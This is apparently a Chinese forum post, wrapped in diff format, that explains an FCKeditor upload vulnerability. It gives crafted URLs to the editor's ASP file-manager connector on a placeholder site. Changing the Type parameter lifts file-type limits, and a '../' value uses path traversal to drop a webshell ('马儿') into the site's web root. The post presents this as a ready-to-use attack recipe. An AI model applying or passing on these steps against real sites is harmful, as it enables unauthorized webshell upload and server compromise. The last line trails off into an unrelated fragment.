@@ -1,0 +1,9 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+FCKeditor上传漏洞
+D8888D主贴内容-------------------------------------------------------
+出现上传漏洞的地址是：[url=http://www.xxx.com/admin/FCKeditor/editor/filemanager/browser/default/browser.html?Type=all&Connector=connectors/asp/connector.asp]链接标记http://www.xxx.com/admin/FCKedit ... s/asp/connector.asp[/url]打开这个地址就可以上传任何类型的文件了，马儿上传到的位置是:
+[url=http://www.xxx.com/UserFiles/all/1.asa]链接标记http://www.xxx.com/UserFiles/all/1.asa[/url]
+"Type=all" 这个变量是自己定义的,在这里创建了all这个目录,而且新的目录没有上传文件格式的限制.比如输入:[url=http://www.xxx.com/admin/FCKeditor/editor/filemanager/browser/default/browser.html?Type=monyer&Connector=connectors/asp/connector.asp]链接标记http://www.xxx.com/admin/FCKedit ... s/asp/connector.asp[/url]所传的文件就到了 [url=http://www.xxx.com/UserFiles/monyer/]链接标记http://www.xxx.com/UserFiles/monyer/[/url] 下了而如果这样输入:[url=http://www.xxx.com/admin/FCKeditor/editor/filemanager/browser/default/browser.html?Type=../&Connector=connectors/asp/connector.asp]链接标记http://www.xxx.com/admin/FCKedit ... s/asp/connector.asp[/url]
+就可以传到网站的根目录下,网站支持什么脚本,传什么脚本的马就可以了.所传的文件就到了网站根目录下了譬如百度空间发帖助手的文件上传
